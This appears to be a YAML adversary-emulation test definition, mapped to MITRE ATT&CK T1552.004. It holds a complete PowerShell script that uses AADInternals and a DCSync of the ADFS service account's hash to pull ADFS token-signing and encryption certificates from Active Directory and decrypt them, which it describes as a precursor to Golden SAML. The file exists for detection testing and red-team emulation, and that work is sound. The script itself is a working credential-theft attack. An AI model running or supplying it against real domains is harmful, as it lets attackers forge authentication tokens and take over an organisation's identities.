api_version: "2.0"
name: ADFS token signing and encryption certificates theft - Remote
description: |
    Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.
    Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
args:
    - name: replication_user
      type: string
      default: Administrator
    - name: replication_password
      type: string
      default: ReallyStrongPassword
    - name: adfs_server_name
      type: string
      default: sts.contoso.com
    - name: adfs_service_account_name
      type: string
      default: adfs_svc
uuid: cab413d8-9e4a-4b8d-9b84-c985bd73a442
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1552: Unsecured Credentials'
    subtechniques:
        - 'T1552.004: Private Keys'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        AADInternals and ActiveDirectory modules must be installed.
      inline: |
        if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}
      executor: powershell
    - name: adfs-token-signing-and-encryption-certificates-theft---remote
      inline: "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"{{.Args.adfs_service_account_name}}\"\n$PWord = ConvertTo-SecureString -String \"{{.Args.replication_password}}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList {{.Args.replication_user}}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server {{.Args.adfs_server_name}}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n"
      executor: powershell
      cleanup:
        inline: |
            Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
            Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
        executor: powershell
